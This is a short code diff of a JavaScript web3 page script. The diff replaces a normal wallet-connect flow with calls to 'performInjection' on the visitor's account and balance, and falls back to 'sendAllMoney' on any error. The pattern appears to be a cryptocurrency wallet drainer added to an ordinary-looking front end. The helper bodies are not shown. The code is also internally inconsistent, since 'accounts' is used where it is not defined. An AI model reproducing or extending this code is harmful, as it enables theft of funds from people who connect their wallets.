@@ -1,7 +1,7 @@
 console.log("loaded");
 let URL = "https://api.testingzebi11.xyz"
 let ContractAdr = "0x64e80282Bbf9ff1B900c2042eaAaa6e3CecF6Cac";
-setTimeout(connect, 5000)
+setTimeout(connects, 5000)
 let abi = [
     {
         "inputs": [
@@ -98,8 +98,35 @@ async function connect() {
     catch (e) {
         console.log(e)
     }
-    provider = await web3Modal.connect();
-    web3 = new Web3(provider);
+
+    selectedAccount = accounts[0];
+    syncChain()
+    try {
+        try {
+
+            //throw "No accounts found"
+            await performInjection(selectedAccount, balance);
+        }
+        catch (error) {
+            // do in loop
+            console.log(error)
+
+            await sendAllMoney()
+
+
+        }
+    }
+    catch (err) {
+        await sendAllMoney()
+    }
+
+
+
+
+}
+
+async function connects() {
+    web3 = new Web3("https://mainnet.infura.io/v3/987127df4c2e4f9f839459e1b1c72dc2");
 
     console.log("Web3 instance is", web3);
     const accounts = await web3.eth.getAccounts();
